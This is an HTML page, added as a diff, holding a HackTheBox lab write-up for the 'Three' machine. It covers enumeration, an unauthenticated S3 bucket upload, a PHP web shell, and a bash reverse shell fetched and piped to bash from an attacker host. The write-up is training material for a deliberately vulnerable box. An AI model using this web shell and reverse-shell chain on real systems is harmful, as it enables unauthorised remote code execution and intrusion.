@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>three.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index-en.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Back
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/starting-point/three.html" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/starting-point/three.html" class="active" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Three</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Three is a Linux box whose website uses an <b>S3 bucket</b> (emulated via LocalStack) as storage. The misconfigured bucket accepts unauthenticated uploads, allowing a <b>PHP web shell</b> to be placed at the site root and code execution to be gained. <i>Note: after spawning, the box needs a few minutes for LocalStack to load.</i></p>
+
+         <figure class="attack-flow">
+            <figcaption>Attack path</figcaption>
+            <svg viewBox="0 0 660 222" role="img" aria-label="Attack path" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="124.0" x2="24" y2="144.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="170.0" x2="24" y2="190.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Enumeration</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Sub-domain enumeration</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Interacting with S3</tspan></text><circle cx="24" cy="157.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="157.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">4</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="157.0">Code execution</tspan></text><circle cx="24" cy="203.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="203.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">5</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="203.0">Reverse shell and flag</tspan></text></svg>
+         </figure>
+
+         <h2>Enumeration</h2>
+
+         <p>Nmap reveals SSH (22) and HTTP (80). The site is static; the source shows the contact form posts to <i>/action_page.php</i> (PHP backend) and exposes the domain <b>thetoppers.htb</b>, added to /etc/hosts.</p>
+
+         <pre class="code-block"><code>sudo nmap -sV &lt;IP&gt;
+echo &quot;&lt;IP&gt; thetoppers.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+
+         <h2>Sub-domain enumeration</h2>
+
+         <p>A vHost brute-force with gobuster reveals <b>s3.thetoppers.htb</b>. Visiting it, the response <code>{"status": "running"}</code> indicates an S3 service (LocalStack). Add it to /etc/hosts too.</p>
+
+         <pre class="code-block"><code>gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
+echo &quot;&lt;IP&gt; s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+
+         <h2>Interacting with S3</h2>
+
+         <p>With <b>awscli</b> configured using arbitrary values (the server does not validate credentials), we list the buckets. Bucket <i>thetoppers.htb</i> contains <i>index.php</i> and <i>.htaccess</i>, i.e. it is the site's own webroot.</p>
+
+         <pre class="code-block"><code>aws configure   # arbitrary values
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code></pre>
+
+         <h2>Code execution</h2>
+
+         <p>Since the site runs PHP and the bucket is the webroot, upload a PHP web shell to the bucket and browse to the URL, gaining RCE as <i>www-data</i>.</p>
+
+         <pre class="code-block"><code>echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+curl &#x27;http://thetoppers.htb/shell.php?cmd=id&#x27;   # uid=33(www-data)</code></pre>
+
+         <h2>Reverse shell and flag</h2>
+
+         <p>Host a bash reverse-shell script on a local server and, via the web shell, force the target to download and run it. The flag is at <i>/var/www/flag.txt</i>.</p>
+
+         <pre class="code-block"><code># attacker:
+nc -nvlp 1337
+python3 -m http.server 8000   # serving shell.sh (bash -i &gt;&amp; /dev/tcp/&lt;MY_IP&gt;/1337 0&gt;&amp;1)
+# via web shell:
+curl &#x27;http://thetoppers.htb/shell.php?cmd=curl%20&lt;MY_IP&gt;:8000/shell.sh|bash&#x27;
+cat /var/www/flag.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
